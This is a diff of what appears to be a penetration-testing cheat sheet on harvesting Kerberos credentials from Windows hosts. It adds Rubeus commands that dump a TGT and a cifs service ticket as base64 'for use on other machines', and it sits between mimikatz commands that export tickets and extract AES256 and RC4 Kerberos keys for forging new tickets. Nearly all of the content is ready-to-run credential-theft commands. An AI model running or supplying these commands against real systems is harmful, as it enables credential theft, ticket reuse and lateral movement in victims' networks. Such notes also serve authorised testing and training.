@@ -1443,8 +1443,13 @@ mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
 # Harvesting Kerberos tickets from Windows by Rubeus   ( it wil export ticket to file .kirbi )
 Rubeus.exe dump /nowrap
 
-(when Exported tickets fail or ticket has expired , we can run below command to extracted Encryption Keys to generate new tickets )
+# Export TGT to base64 string for use on other machines
+.\Rubeus.exe dump /luid:0xfc4b4c /service:krbtgt /nowrap
 
+# Export TGS to base64 string for use on other machines
+.\Rubeus.exe dump /luid:0x98b07 /service:cifs /nowrap
+
+(when Exported tickets fail or ticket has expired , we can run below command to extracted Encryption Keys to generate new tickets )
 # Mimikatz - Extract Kerberos keys  ( we can get AES256_HMAC and  RC4_HMAC key )  ( RC4_HMAC same NTLM hash) 
 mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
 
